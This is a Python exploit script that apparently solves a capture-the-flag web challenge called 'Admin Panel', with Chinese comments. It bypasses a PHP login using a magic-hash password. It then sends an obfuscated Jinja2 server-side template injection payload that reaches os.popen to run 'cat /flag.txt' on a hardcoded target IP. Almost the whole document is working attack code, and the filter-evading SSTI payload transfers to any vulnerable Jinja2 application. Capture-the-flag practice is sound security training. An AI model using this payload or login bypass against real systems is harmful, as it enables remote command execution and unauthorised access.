#!/usr/bin/env python3
"""
题目名称: Admin Panel
类别: Web (SSTI + Magic Hash)
解题思路:
    1. 利用 PHP Magic Hash (240610708) 绕过登录验证
    2. 登录后在 dashboard 的 title 字段注入 Jinja2 SSTI payload
    3. 通过 SSTI 执行系统命令读取 /flag.txt
"""

import re
import sys

import requests

# 目标地址（可通过命令行参数覆盖）
TARGET_BASE = "http://103.54.19.209"
# Magic Hash 绕过密码
MAGIC_HASH_PASSWORD = "240610708"
# flag 正则匹配
FLAG_PATTERN = r"novruzctf\{[^}]+\}"


def exploit(base_url: str = TARGET_BASE) -> str:
    """执行 SSTI 攻击获取 flag"""
    s = requests.Session()

    # 第一步：利用 Magic Hash 绕过登录
    s.post(f"{base_url}/", data={"login": "admin", "pwd": MAGIC_HASH_PASSWORD})

    # 第二步：构造 Jinja2 SSTI payload 读取 flag
    payload = """{{
((cycler|attr("_"*2 ~ "init" ~ "_"*2)|attr("_"*2 ~ "globals" ~ "_"*2))["os"]).popen("cat /flag.txt").read()
}}"""

    resp = s.post(f"{base_url}/dashboard.php", data={"title": payload})
    match = re.search(FLAG_PATTERN, resp.text)
    return match.group(0) if match else f"未找到 flag，响应内容:\n{resp.text[:500]}"


if __name__ == "__main__":
    url = sys.argv[1] if len(sys.argv) > 1 else TARGET_BASE
    try:
        result = exploit(url)
        print(result)
    except requests.RequestException as e:
        print(f"[!] 请求失败: {e}", file=sys.stderr)
        sys.exit(1)
